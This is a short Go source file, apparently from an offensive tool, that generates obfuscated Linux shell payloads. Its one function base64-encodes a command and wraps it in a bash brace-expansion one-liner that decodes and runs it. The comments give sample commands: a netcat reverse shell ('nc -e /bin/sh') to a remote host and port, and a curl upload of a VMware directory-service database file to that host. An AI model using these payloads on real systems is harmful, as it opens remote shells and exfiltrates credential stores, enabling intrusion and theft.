package reverse

import (
	"encoding/base64"
	"fmt"
)

// cmd nc -e /bin/sh %s %s  , rhost 192.168.0.111, rport 7777
// Get sensitive file: curl -F "file=@/storage/db/vmware-vmdir/data.mdb" http://%s:%s/   , rhost 192.168.0.111, rport 7777
// cmd nc -e /bin/sh %s %s  , rhost 192.168.0.111, rport 7777
func GenLinuxShell(rhost, rport, cmd string) string {
	s1 := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf(cmd, rhost, rport)))
	return fmt.Sprintf("bash -c {echo,%s}|{base64,-d}|{bash,-i}", s1)
}
